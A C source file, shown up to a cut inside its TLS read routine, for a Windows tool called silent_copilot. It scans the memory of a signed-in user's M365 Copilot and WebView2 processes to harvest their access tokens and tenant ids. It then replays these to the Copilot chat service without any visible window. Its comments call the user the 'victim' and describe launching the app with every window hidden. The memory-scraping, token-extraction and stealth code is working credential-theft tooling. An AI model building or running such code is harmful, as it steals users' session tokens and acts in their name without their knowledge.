/*
 * silent_copilot.c - talk to M365 Copilot without any UI.
 *
 * Dynamically harvests the substrate access token (JWE) and session-tenant
 * GUID that the victim's signed-in M365Copilot currently holds in memory
 * (M365Copilot.exe / msedgewebview2.exe), then speaks the Sydney/Chathub
 * SignalR-over-WebSocket protocol directly with a fresh client-generated
 * conversation id, and prints the model's reply to stdout.
 *
 * If no Copilot session is running, it can launch M365Copilot inside the
 * interactive session of the signed-in user, hiding every window the app
 * creates, and harvest the fresh session the app establishes.
 *
 * Nothing machine-specific is hardcoded: tokens, tenant/session ids and
 * variants are all recovered at run time.
 *
 * Build (MinGW cross; TLS = Windows' inbox Schannel — no third-party libs):
 *   x86_64-w64-mingw32-gcc -std=c89 -Wall -Wextra -Werror -O2 \
 *       silent_copilot.c -o silent_copilot.exe \
 *       -mwindows -lws2_32 -lbcrypt \
 *       -ladvapi32 -lwtsapi32 -lole32 -loleaut32 -lkernel32 -lcrypt32 -lsecur32
 *
 * The binary is GUI-subsystem (-mwindows) so it never pops a console window
 * when launched by the hidden-launch path; output goes through raw Win32
 * writes to whatever stdout/stderr handles are inherited (SSH pipe, console,
 * or file redirection).
 */
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <wtsapi32.h>
#define COBJMACROS 1
#define CINTERFACE 1
#include <taskschd.h>
#include <objbase.h>
/* Transport security: Windows Schannel (SSPI) — the inbox TLS stack, so the
 * exe links nothing third-party (no vendored OpenSSL; imports OS DLLs only).
 * Server certificates are chain-validated against the Windows trust store
 * (SCH_CRED_AUTO_CRED_VALIDATION). */
#ifndef SECURITY_WIN32
#define SECURITY_WIN32
#endif
#include <security.h>
#include <schannel.h>
#include <bcrypt.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static int hex_val(char c);
static int hex_val_l(char c);

/* ------------------------------------------------------------------ */
/* tunables                                                            */
/* ------------------------------------------------------------------ */
#define READ_CHUNK ((SIZE_T)(256 * 1024))
#define SCAN_OVERLAP 128 /* bytes kept between read windows   */
#define MAX_TOKEN 4096   /* JWE access token max length        */
#define MAX_VARS 8192    /* variants string                    */
#define MAX_PAIRS 32
#define WS_RECV_CAP (2 * 1024 * 1024)
#define TEXT_CAP (256 * 1024)
#define PAIR_TIMEOUT_MS 30000    /* per-token total attempt timeout    */
#define GLOBAL_ATTEMPT_MS 420000 /* overall deadline for all attempts  */
#define SCAN_SESSION_RETRIES 25  /* rescan while waiting for session   */
#define HIDE_WATCH_SEC 90        /* window-hiding loop in --launch-hide*/

/* substrate/session markers (protocol constants, not machine-specific) */
static const char JWE_MARK[] = "eyJhbGciOiJkaXIi";       /* {"alg":"dir"} JWE  */
static const char VAR_MARK[] = "EnableMcpServerWidgets"; /* variants blob start */
static const char* HOST_NAME = "substrate.office.com";
static const char* CHATHUB_PREFIX = "/m365Copilot/Chathub/";
static const char* APP_EXE = "m365copilot.exe";
static const char* WEBVIEW_EXE = "msedgewebview2.exe";
static const char* AUMID =
    "Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe!Microsoft.MicrosoftOfficeHub";

/* ------------------------------------------------------------------ */
/* output helpers (raw Win32 writes; immune to CRT buffering)          */
/* ------------------------------------------------------------------ */
static HANDLE g_out_h = NULL;
static HANDLE g_err_h = NULL;

static void init_output(void) {
    /* capture inherited handles FIRST: AttachConsole replaces them with
     * console handles, which would swallow output on ssh/spawned runs that
     * rely on inherited pipes */
    g_out_h = GetStdHandle(STD_OUTPUT_HANDLE);
    g_err_h = GetStdHandle(STD_ERROR_HANDLE);
    if (g_out_h == INVALID_HANDLE_VALUE)
        g_out_h = NULL;
    if (g_err_h == INVALID_HANDLE_VALUE)
        g_err_h = NULL;
    if (!g_out_h && !g_err_h) {
        /* truly handle-less (e.g. task scheduler): attach to the parent's
         * console so interactive cmd/powershell runs still see output */
        if (AttachConsole(ATTACH_PARENT_PROCESS)) {
            g_out_h = GetStdHandle(STD_OUTPUT_HANDLE);
            g_err_h = GetStdHandle(STD_ERROR_HANDLE);
            if (g_out_h == INVALID_HANDLE_VALUE)
                g_out_h = NULL;
            if (g_err_h == INVALID_HANDLE_VALUE)
                g_err_h = NULL;
        }
    }
    if (!g_err_h)
        g_err_h = g_out_h;
    if (!g_out_h)
        g_out_h = g_err_h;
}

static void raw_write(HANDLE h, const char* s, int len) {
    DWORD wrote = 0;
    if (h == NULL || h == INVALID_HANDLE_VALUE)
        return;
    WriteFile(h, s, (DWORD)len, &wrote, NULL);
}

static void out_s(const char* s) {
    raw_write(g_out_h, s, (int)strlen(s));
}
static void err_s(const char* s) {
    raw_write(g_err_h, s, (int)strlen(s));
}

/* tiny snprintf-into-buffer then emit (stderr) - varargs-free core */
static void err_f(const char* buf) {
    err_s(buf);
    err_s("\n");
}

/* diagnostic log next to the exe (used by the hidden-launch path) */
static int g_trace = 0; /* --trace: enable the dbg log + stderr frame dumps */

static void dbg_log(const char* s) {
    static char logpath[MAX_PATH];
    HANDLE f;
    DWORD w = 0;
    if (!g_trace)
        return; /* default: no disk writes of any kind */
    if (!logpath[0]) {
        int i, last = -1;
        GetModuleFileNameA(NULL, logpath, MAX_PATH);
        for (i = 0; logpath[i]; i++)
            if (logpath[i] == '\\')
                last = i;
        if (last >= 0)
            logpath[last + 1] = 0;
        strncat(logpath, "silent_copilot_dbg.log", MAX_PATH - strlen(logpath) - 1);
    }
    f = CreateFileA(logpath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                    OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE)
        return;
    {
        SYSTEMTIME st;
        char ts[64];
        GetLocalTime(&st);
        _snprintf(ts, sizeof(ts), "[%02d:%02d:%02d.%03d] ", st.wHour, st.wMinute, st.wSecond,
                  st.wMilliseconds);
        WriteFile(f, ts, (DWORD)strlen(ts), &w, NULL);
        WriteFile(f, s, (DWORD)strlen(s), &w, NULL);
        WriteFile(f, "\r\n", 2, &w, NULL);
    }
    CloseHandle(f);
}

/* ------------------------------------------------------------------ */
/* small utils                                                         */
/* ------------------------------------------------------------------ */
static int is_b64u(char c) {
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' ||
           c == '_' || c == '.' || c == '=';
}
static int is_hex_c(char c) {
    return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
}
static int is_var_char(char c) {
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == ',' ||
           c == '.' || c == '_';
}

static int hex_val(char c) {
    if (c >= '0' && c <= '9')
        return c - '0';
    if (c >= 'a' && c <= 'f')
        return c - 'a' + 10;
    if (c >= 'A' && c <= 'F')
        return c - 'A' + 10;
    return 0;
}
static int hex_val_l(char c) {
    return hex_val(c);
}
static int readable_protect(DWORD p) {
    return p == PAGE_READWRITE || p == PAGE_READONLY || p == PAGE_EXECUTE_READ ||
           p == PAGE_EXECUTE_READWRITE || p == PAGE_WRITECOPY || p == PAGE_EXECUTE_WRITECOPY;
}

/* GUID shape: 8-4-4-4-12 hex */
static int guid_at(const unsigned char* b, int off, int blen, char out[40]) {
    int i;
    if (off < 0 || off + 36 > blen)
        return 0;
    for (i = 0; i < 36; i++) {
        char c = (char)b[off + i];
        if (i == 8 || i == 13 || i == 18 || i == 23) {
            if (c != '-')
                return 0;
        } else if (!is_hex_c(c))
            return 0;
    }
    memcpy(out, b + off, 36);
    out[36] = 0;
    return 1;
}

/* ------------------------------------------------------------------ */
/* harvested artifacts                                                 */
/* ------------------------------------------------------------------ */
static char g_oid[40];
static char g_sten[40];
static char g_vars[MAX_VARS];
static int g_vars_len = 0;
static char g_tokens[MAX_PAIRS][MAX_TOKEN];
static int g_ntok = 0;

static void token_add(const char* tok) {
    int i;
    size_t tl;
    for (i = 0; i < g_ntok; i++)
        if (strcmp(g_tokens[i], tok) == 0)
            return; /* dedupe */
    if (g_ntok >= MAX_PAIRS)
        return;
    tl = strlen(tok);
    if (tl > MAX_TOKEN - 1)
        tl = MAX_TOKEN - 1;
    memcpy(g_tokens[g_ntok], tok, tl);
    g_tokens[g_ntok][tl] = 0;
    g_ntok++;
}

/* scan one memory buffer (with SCAN_OVERLAP bytes of the previous window
 * prepended) for all artifacts */
static void scan_buf(const unsigned char* buf, int blen) {
    int i;
    /* STEN: GUID whose last 12 hex are 'a' (tenant/session id) */
    if (g_sten[0] == 0) {
        for (i = 0; i + 36 <= blen; i++) {
            char g[40];
            if (guid_at(buf, i, blen, g) && memcmp(g + 24, "aaaaaaaaaaaa", 12) == 0) {
                memcpy(g_sten, g, 37);
                break;
            }
        }
    }
    /* OID: v1 GUID starting 00000000-0000-1 (optional, pass-2 URL) */
    if (g_oid[0] == 0) {
        for (i = 0; i + 36 <= blen; i++) {
            char g[40];
            if (guid_at(buf, i, blen, g) && g[14] == '1' && memcmp(g, "00000000-0000", 13) == 0) {
                memcpy(g_oid, g, 37);
                break;
            }
        }
    }
    /* VARIANTS blob (optional, pass-2 URL) */
    for (i = 0; i + (int)(sizeof(VAR_MARK) - 1) <= blen; i++) {
        if (memcmp(buf + i, VAR_MARK, sizeof(VAR_MARK) - 1) == 0) {
            int v = i, w = 0;
            char vars[MAX_VARS];
            while (w < (int)sizeof(vars) - 1 && v < blen && is_var_char((char)buf[v])) {
                vars[w++] = (char)buf[v++];
            }
            vars[w] = 0;
            if (w > g_vars_len) {
                memcpy(g_vars, vars, (size_t)w + 1);
                g_vars_len = w;
            }
        }
    }
    /* JWE access tokens (alg=dir) */
    for (i = 0; i + (int)(sizeof(JWE_MARK) - 1) <= blen; i++) {
        if (memcmp(buf + i, JWE_MARK, sizeof(JWE_MARK) - 1) == 0) {
            int j = i, k = 0;
            char tok[MAX_TOKEN];
            while (k < (int)sizeof(tok) - 1 && j < blen && is_b64u((char)buf[j])) {
                tok[k++] = (char)buf[j++];
            }
            tok[k] = 0;
            if (k < 200)
                continue;
            token_add(tok);
        }
    }
}

/* region-accurate process memory scan */
static void scan_process(HANDLE h) {
    MEMORY_BASIC_INFORMATION mbi;
    unsigned char* buf;
    unsigned char* base = 0;
    buf = (unsigned char*)malloc(READ_CHUNK + SCAN_OVERLAP);
    if (!buf)
        return;
    while (VirtualQueryEx(h, base, &mbi, sizeof(mbi)) != 0) {
        if (mbi.State == MEM_COMMIT && mbi.RegionSize > 0 && readable_protect(mbi.Protect) &&
            !(mbi.Protect & PAGE_GUARD)) {
            SIZE_T done = 0;
            while (done < mbi.RegionSize) {
                SIZE_T want = mbi.RegionSize - done;
                SIZE_T rd = 0;
                int ok;
                if (want > READ_CHUNK)
                    want = READ_CHUNK;
                ok = ReadProcessMemory(h, (unsigned char*)mbi.BaseAddress + done,
                                       buf + (done ? SCAN_OVERLAP : 0), want, &rd);
                if (ok && rd > 64)
                    scan_buf(buf, (int)rd + (done ? SCAN_OVERLAP : 0));
                if (!ok || rd == 0) { /* skip the rest of this window */
                    done += want;
                } else {
                    memmove(buf, buf + SCAN_OVERLAP + rd - SCAN_OVERLAP, SCAN_OVERLAP);
                    done += rd;
                }
            }
        }
        base = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
        if ((ULONG_PTR)base > 0x7FFFFFFFFFFFULL)
            break;
    }
    free(buf);
}

static int name_is(const char* exe, const WCHAR* wname) {
    char nm[64];
    int len = 0, k;
    while (wname[len] && len < (int)sizeof(nm) - 1) {
        WCHAR c = wname[len];
        nm[len] = (c < 128) ? (char)c : '?';
        len++;
    }
    nm[len] = 0;
    for (k = 0; k < len; k++)
        if (nm[k] >= 'A' && nm[k] <= 'Z')
            nm[k] = (char)(nm[k] + 32);
    return strcmp(nm, exe) == 0;
}

/* collect pids whose exe name matches m365copilot.exe or msedgewebview2.exe;
 * the main app first (most likely to hold a fresh session) */
static int collect_pids(DWORD* out, int cap) {
    HANDLE snap;
    PROCESSENTRY32W pe;
    int n = 0;
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (name_is(APP_EXE, pe.szExeFile) && n < cap)
                out[n++] = pe.th32ProcessID;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    /* webview2 hosts after the main app */
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return n;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (name_is(WEBVIEW_EXE, pe.szExeFile) && n < cap)
                out[n++] = pe.th32ProcessID;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return n;
}

static void scan_all_processes(void) {
    DWORD pids[64];
    int n, i;
    n = collect_pids(pids, 64);
    for (i = 0; i < n; i++) {
        HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pids[i]);
        if (h) {
            scan_process(h);
            CloseHandle(h);
        }
    }
}

/* is M365Copilot.exe itself currently running? */
static int app_process_running(void) {
    HANDLE snap;
    PROCESSENTRY32W pe;
    int found = 0;
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (name_is(APP_EXE, pe.szExeFile)) {
                found = 1;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

static int debug_on(void) {
    /* NOLINTNEXTLINE(concurrency-mt-unsafe): single-threaded tool */
    const char* e = getenv("SC_DEBUG");
    return g_trace || (e != NULL && *e != 0);
}

/* ------------------------------------------------------------------ */
/* random ids                                                          */
/* ------------------------------------------------------------------ */
static void rand_bytes(unsigned char* b, int n) {
    if (BCryptGenRandom(NULL, b, (ULONG)n, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0) {
        int i;
        DWORD t = GetTickCount();
        for (i = 0; i < n; i++) {
            t = t * 1103515245UL + 12345UL;
            b[i] = (unsigned char)(t >> 16);
        }
    }
}

static void hex32(char out[33]) {
    unsigned char b[16];
    static const char* hd = "0123456789abcdef";
    int i;
    rand_bytes(b, 16);
    for (i = 0; i < 16; i++) {
        int j = i * 2;
        out[j] = hd[b[i] >> 4];
        out[j + 1] = hd[b[i] & 15];
    }
    out[32] = 0;
}

static void uuid4(char out[37]) {
    char h[33];
    hex32(h);
    /* 8-4-4-4-12 with v4/variant bits */
    h[12] = '4';
    h[16] = (char)((("89ab")[hex_val(h[16]) & 3]));
    {
        int di = 0, si;
        for (si = 0; si < 32; si++) {
            out[di++] = h[si];
            if (si == 7 || si == 11 || si == 15 || si == 19)
                out[di++] = '-';
        }
        out[di] = 0;
    }
}

/* ------------------------------------------------------------------ */
/* JSON escaping (prompt)                                              */
/* ------------------------------------------------------------------ */
static char* json_escape(const char* in) {
    size_t need = 2, i, j;
    char* o;
    for (i = 0; in[i]; i++) {
        unsigned char c = (unsigned char)in[i];
        need += (c == '"' || c == '\\') ? 2 : (c < 32 ? 6 : 1);
    }
    o = (char*)malloc(need + 1);
    if (!o)
        return NULL;
    j = 0;
    for (i = 0; in[i]; i++) {
        unsigned char c = (unsigned char)in[i];
        if (c == '"' || c == '\\') {
            o[j++] = '\\';
            o[j++] = (char)c;
        } else if (c == '\n') {
            o[j++] = '\\';
            o[j++] = 'n';
        } else if (c == '\r') {
            o[j++] = '\\';
            o[j++] = 'r';
        } else if (c == '\t') {
            o[j++] = '\\';
            o[j++] = 't';
        } else if (c < 32) {
            static const char* hd = "0123456789abcdef";
            o[j++] = '\\';
            o[j++] = 'u';
            o[j++] = '0';
            o[j++] = '0';
            o[j++] = hd[c >> 4];
            o[j++] = hd[c & 15];
        } else
            o[j++] = (char)c;
    }
    o[j] = 0;
    return o;
}

/* encode one unicode codepoint as UTF-8 into dst (returns bytes written) */
/* NOLINTNEXTLINE(bugprone-easily-swappable-parameters) */
static int utf8_emit(char* dst, int n, int cap, unsigned long cp) {
    if (cp < 0x80) {
        if (n >= cap)
            return 0;
        dst[n] = (char)cp;
        return 1;
    }
    if (cp < 0x800) {
        if (n + 1 >= cap)
            return 0;
        dst[n] = (char)(0xC0 | (cp >> 6));
        dst[n + 1] = (char)(0x80 | (cp & 63));
        return 2;
    }
    if (cp < 0x10000) {
        if (n + 2 >= cap)
            return 0;
        dst[n] = (char)(0xE0 | (cp >> 12));
        dst[n + 1] = (char)(0x80 | ((cp >> 6) & 63));
        dst[n + 2] = (char)(0x80 | (cp & 63));
        return 3;
    }
    if (n + 3 >= cap)
        return 0;
    dst[n] = (char)(0xF0 | (cp >> 18));
    dst[n + 1] = (char)(0x80 | ((cp >> 12) & 63));
    dst[n + 2] = (char)(0x80 | ((cp >> 6) & 63));
    dst[n + 3] = (char)(0x80 | (cp & 63));
    return 4;
}

static unsigned long hex4(const char* q) {
    return ((unsigned long)hex_val_l(q[0]) << 12) | ((unsigned long)hex_val_l(q[1]) << 8) |
           ((unsigned long)hex_val_l(q[2]) << 4) | (unsigned long)hex_val_l(q[3]);
}

/* skip a JSON string starting at *qp (opening quote); advances past it */
static void skip_json_string(const char** qp) {
    const char* q = *qp + 1;
    while (*q) {
        if (*q == '\\' && q[1]) {
            q += 2;
            continue;
        }
        if (*q == '"') {
            q++;
            break;
        }
        q++;
    }
    *qp = q;
}

/* decode a JSON string starting at q (which points at the opening quote);
 * advances q past the closing quote; returns bytes written */
static int json_decode_string(const char** qp, char* dst, int cap) {
    const char* q = *qp + 1;
    int n = 0;
    while (*q && n < cap - 1) {
        if (*q == '"') {
            *qp = q + 1;
            dst[n] = 0;
            return n;
        }
        if (*q == '\\' && q[1]) {
            q++;
            if (*q == 'n')
                dst[n++] = '\n';
            else if (*q == 't')
                dst[n++] = '\t';
            else if (*q == 'r')
                dst[n++] = '\r';
            else if (*q == 'b')
                dst[n++] = '\b';
            else if (*q == 'f')
                dst[n++] = '\f';
            else if (*q == '/')
                dst[n++] = '/';
            else if (*q == '\\')
                dst[n++] = '\\';
            else if (*q == '"')
                dst[n++] = '"';
            else if (*q == 'u' && q[1] && q[2] && q[3] && q[4]) {
                /* q sits at 'u'; escape is q[0..4] */
                unsigned long cp = hex4(q + 1);
                if (cp >= 0xD800 && cp <= 0xDBFF && q[5] == '\\' && q[6] == 'u' && q[7] && q[8] &&
                    q[9] && q[10]) {
                    /* surrogate pair: second escape is q[5..10] */
                    unsigned long lo = hex4(q + 7);
                    if (lo >= 0xDC00 && lo <= 0xDFFF) {
                        cp = 0x10000UL + ((cp - 0xD800UL) << 10) + (lo - 0xDC00UL);
                        n += utf8_emit(dst, n, cap - 1, cp);
                        q += 10; /* to last hex digit of the pair */
                    } else {
                        n += utf8_emit(dst, n, cap - 1, cp);
                        q += 4;
                    }
                } else {
                    n += utf8_emit(dst, n, cap - 1, cp);
                    q += 4;
                }
            } else
                dst[n++] = *q;
        } else
            dst[n++] = *q;
        q++;
    }
    *qp = q;
    dst[n] = 0;
    return n;
}

/* extract the reply: the text of the LAST top-level message object in the
 * FIRST "messages" array of the frame (mirrors the reference client: it
 * iterates item.messages / arguments[0].messages; a later bot message
 * overwrites the earlier user message). Suggestion texts are nested deeper
 * (inside each message object) and are ignored. */
static int json_extract_reply(const char* frag, char* dst, int cap) {
    const char* p = strstr(frag, "\"messages\"");
    if (!p)
        return 0;
    p = strchr(p + 10, '[');
    if (!p)
        return 0;
    p++;
    {
        int depth = 1; /* we are just past the opening '[' */
        int found = 0;
        while (*p) {
            if (*p == '"') {
                /* a whole JSON string key/value */
                if (depth == 2 && strncmp(p, "\"text\"", 6) == 0) {
                    const char* n2 = p + 6;
                    while (*n2 == ' ' || *n2 == ':')
                        n2++;
                    if (*n2 == '"') {
                        json_decode_string(&n2, dst, cap);
                        found = 1;
                        p = n2;
                        continue;
                    }
                }
                skip_json_string(&p);
                continue;
            }
            if (*p == '[' || *p == '{')
                depth++;
            else if (*p == ']' || *p == '}') {
                depth--;
                if (depth <= 0)
                    break;
            }
            p++;
        }
        return found;
    }
}

/* extract result.message from a completion frame (the definitive answer) */
static int json_result_message(const char* frag, char* dst, int cap) {
    const char* p = strstr(frag, "\"result\"");
    if (!p)
        return 0;
    p = strstr(p + 10, "\"message\"");
    if (!p)
        return 0;
    p += 9;
    while (*p == ' ' || *p == ':')
        p++;
    if (*p != '"')
        return 0;
    return json_decode_string(&p, dst, cap) > 0;
}

static int json_type(const char* frag) {
    const char* p = strstr(frag, "\"type\"");
    if (!p)
        return -1;
    p += 6;
    while (*p == ' ' || *p == ':')
        p++;
    return atoi(p);
}

/* ------------------------------------------------------------------ */
/* Schannel (SSPI) TLS layer — replaces OpenSSL                         */
/* ------------------------------------------------------------------ */

typedef struct TlsConn {
    CtxtHandle ctxt;
    SOCKET sock;
    int have_ctxt;
    unsigned char* rbuf; /* raw ciphertext pending decrypt */
    int rlen, rcap;
    unsigned char* plain; /* decrypted bytes not yet consumed */
    int plen, poff, pcap;
    unsigned char* wstage; /* header+chunk+trailer encrypt staging */
    int wcap;
} TlsConn;

static CredHandle g_tls_creds;
static int g_tls_creds_ok = 0;
static SecPkgContext_StreamSizes g_tls_sz;

static int sock_send_all(SOCKET sck, const unsigned char* b, int n) {
    int off = 0;
    while (off < n) {
        int w = send(sck, (const char*)b + off, n - off, 0);
        if (w <= 0)
            return -1;
        off += w;
    }
    return 0;
}

/* one-time credential: client TLS; cert chain validated by Windows */
static int tls_global_init(void) {
    SCHANNEL_CRED sc;
    TimeStamp ts;
    SECURITY_STATUS rc;
    if (g_tls_creds_ok)
        return 0;
    memset(&sc, 0, sizeof(sc));
    sc.dwVersion = SCHANNEL_CRED_VERSION;
    sc.dwFlags = SCH_CRED_AUTO_CRED_VALIDATION | SCH_CRED_NO_DEFAULT_CREDS;
    sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
    rc = AcquireCredentialsHandleW(NULL, UNISP_NAME_W, SECPKG_CRED_OUTBOUND, NULL, &sc, NULL, NULL,
                                   &g_tls_creds, &ts);
    if (rc != SEC_E_OK)
        return -1;
    g_tls_creds_ok = 1;
    return 0;
}

#define TLS_REQ                                                                                    \
    (ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY |                   \
     ISC_RET_EXTENDED_ERROR | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM |                           \
     ISC_REQ_USE_SUPPLIED_CREDS)

static TlsConn* tls_connect(SOCKET sock, const char* host) {
    TlsConn* tc;
    WCHAR whost[256];
    int i, done = 0, first = 1;
    SECURITY_STATUS rc;
    if (tls_global_init() != 0)
        return NULL;
    for (i = 0; host[i] && i < 255; i++)
        whost[i] = (WCHAR)host[i];
    whost[i] = 0;
    tc = (TlsConn*)calloc(1, sizeof(TlsConn));
    if (!tc)
        return NULL;
    tc->sock = sock;
    tc->rcap = 32768;
    tc->rbuf = (unsigned char*)malloc((size_t)tc->rcap);
    if (!tc->rbuf) {
        free(tc);
        return NULL;
    }
    while (!done) {
        SecBuffer inb[2], outb;
        SecBufferDesc ind, outd;
        unsigned long attrs = 0;
        memset(inb, 0, sizeof(inb));
        memset(&outb, 0, sizeof(outb));
        ind.ulVersion = SECBUFFER_VERSION;
        ind.cBuffers = 2;
        ind.pBuffers = inb;
        outd.ulVersion = SECBUFFER_VERSION;
        outd.cBuffers = 1;
        outd.pBuffers = &outb;
        if (!first) {
            inb[0].BufferType = SECBUFFER_TOKEN;
            inb[0].pvBuffer = tc->rbuf;
            inb[0].cbBuffer = (unsigned long)tc->rlen;
            inb[1].BufferType = SECBUFFER_EMPTY;
        }
        outb.BufferType = SECBUFFER_TOKEN;
        rc = InitializeSecurityContextW(&g_tls_creds, first ? NULL : &tc->ctxt, whost, TLS_REQ, 0,
                                        SECURITY_NATIVE_DREP, first ? NULL : &ind, 0, &tc->ctxt,
                                        &outd, &attrs, NULL);
        if (outb.pvBuffer && outb.cbBuffer) {
            if (sock_send_all(tc->sock, (unsigned char*)outb.pvBuffer, (int)outb.cbBuffer) != 0) {
                FreeContextBuffer(outb.pvBuffer);
                goto fail;
            }
        }
        if (outb.pvBuffer)
            FreeContextBuffer(outb.pvBuffer);
        /* unconsumed server bytes ride back in inb[1] as EXTRA */
        if (!first && inb[1].BufferType == SECBUFFER_EXTRA && inb[1].cbBuffer > 0) {
            memmove(tc->rbuf, (unsigned char*)tc->rbuf + (tc->rlen - (int)inb[1].cbBuffer),
                    (size_t)inb[1].cbBuffer);
            tc->rlen = (int)inb[1].cbBuffer;
        } else if (!first) {
            tc->rlen = 0;
        }
        if (rc == SEC_E_OK) {
            done = 1;
        } else if (rc == SEC_E_INCOMPLETE_MESSAGE || rc == SEC_I_CONTINUE_NEEDED) {
            int r;
            if (tc->rlen + 16384 > tc->rcap) {
                unsigned char* nb = (unsigned char*)realloc(tc->rbuf, (size_t)tc->rcap * 2);
                if (!nb)
                    goto fail;
                tc->rbuf = nb;
                tc->rcap *= 2;
            }
            r = recv(tc->sock, (char*)tc->rbuf + tc->rlen, tc->rcap - tc->rlen, 0);
            if (r <= 0)
                goto fail;
            tc->rlen += r;
        } else {
            goto fail;
        }
        first = 0;
    }
    rc = QueryContextAttributesW(&tc->ctxt, SECPKG_ATTR_STREAM_SIZES, &g_tls_sz);
    if (rc != SEC_E_OK)
        goto fail;
    if (debug_on()) {
        char b[96];
        _snprintf(b, sizeof(b),
                  "[tls] handshake done; leftover ciphertext=%d, hdr=%lu msg=%lu trailer=%lu\n",
                  tc->rlen, (unsigned long)g_tls_sz.cbHeader,
                  (unsigned long)g_tls_sz.cbMaximumMessage, (unsigned long)g_tls_sz.cbTrailer);
        err_s(b);
    }
    tc->have_ctxt = 1;
    tc->wcap = (int)(g_tls_sz.cbHeader + g_tls_sz.cbMaximumMessage + g_tls_sz.cbTrailer);
    tc->wstage = (unsigned char*)malloc((size_t)tc->wcap);
    tc->pcap = 32768;
    tc->plain = (unsigned char*)malloc((size_t)tc->pcap);
    if (!tc->wstage || !tc->plain)
        goto fail;
    return tc;
fail:
    if (tc->have_ctxt)
        DeleteSecurityContext(&tc->ctxt);
    if (tc->rbuf)
        free(tc->rbuf);
    if (tc->wstage)
        free(tc->wstage);
    if (tc->plain)
        free(tc->plain);
    free(tc);
    return NULL;
}

/* encrypt+send plaintext (chunks into TLS records of <= cbMaximumMessage) */
static int tls_write(TlsConn* tc, const unsigned char* data, int len) {
    int off = 0;
    while (off < len) {
        int chunk = len - off;
        SecBuffer bufs[4];
        SecBufferDesc desc;
        SECURITY_STATUS rc;
        int total;
        if (chunk > (int)g_tls_sz.cbMaximumMessage)
            chunk = (int)g_tls_sz.cbMaximumMessage;
        memcpy(tc->wstage + g_tls_sz.cbHeader, data + off, (size_t)chunk);
        memset(bufs, 0, sizeof(bufs));
        bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
        bufs[0].pvBuffer = tc->wstage;
        bufs[0].cbBuffer = g_tls_sz.cbHeader;
        bufs[1].BufferType = SECBUFFER_DATA;
        bufs[1].pvBuffer = tc->wstage + g_tls_sz.cbHeader;
        bufs[1].cbBuffer = (unsigned long)chunk;
        bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
        bufs[2].pvBuffer = tc->wstage + g_tls_sz.cbHeader + chunk;
        bufs[2].cbBuffer = g_tls_sz.cbTrailer;
        bufs[3].BufferType = SECBUFFER_EMPTY;
        desc.ulVersion = SECBUFFER_VERSION;
        desc.cBuffers = 4;
        desc.pBuffers = bufs;
        rc = EncryptMessage(&tc->ctxt, 0, &desc, 0);
        if (rc != SEC_E_OK)
            return -1;
        total = (int)(bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer);
        if (sock_send_all(tc->sock, tc->wstage, total) != 0)
            return -1;
        off += chunk;
    }
    return 0;
}

/* pull one plaintext chunk from the context; 1=data ready in plain, 0=EOF, -1=error */
static int tls_read_fill(TlsConn* tc) {
    for (;;) {
        SecBuffer bufs[4];
        SecBufferDesc desc;
        SECURITY_STATUS rc;
        int i;
        tc->poff = 0;
        tc->plen = 0;
        memset(bufs, 0, sizeof(bufs));
        bufs[0].BufferType = SECBUFFER_DATA;
        bufs[0].pvBuffer = tc->rbuf;
        bufs[0].cbBuffer = (unsigned long)tc->rlen;
        for (i = 1; i < 4; i++)
            bufs[i].BufferType = SECBUFFER_EMPTY;
        desc.ulVersion = SECBUFFER_VERSION;
        desc.cBuffers = 4;
        desc.pBuffers = bufs;
        rc = DecryptMessage(&tc->ctxt, &desc, 0, NULL);
        if (rc == SEC_E_OK || rc == SEC_I_RENEGOTIATE) {
            int extra = 0;
            for (i = 0; i < 4; i++) {
                if (bufs[i].BufferType == SECBUFFER_DATA && bufs[i].cbBuffer > 0) {
                    if ((int)bufs[i].cbBuffer > tc->pcap) {
                        unsigned char* nb = (unsigned char*)realloc(tc->plain, bufs[i].cbBuffer);
                        if (!nb)
                            return -1;
                        tc->plain = nb;
                        tc->pcap = (int)bufs[i].cbBuffer;
                    }
                    memcpy(tc->plain, bufs[i].pvBuffer, bufs[i].cbBuffer);
                    tc->plen = (int)bufs[i].cbBuffer;
                } else if (bufs[i].BufferType == SECBUFFER_EXTRA) {
                    int ex = (int)bufs[i].cbBuffer;
                    memmove(tc->rbuf, (unsigned char*)bufs[i].pvBuffer, (size_t)ex);
                    tc->rlen = ex;
                    extra = 1;
                }
            }
            if (!extra)
                tc->rlen = 0;
            if (rc == SEC_I_RENEGOTIATE)
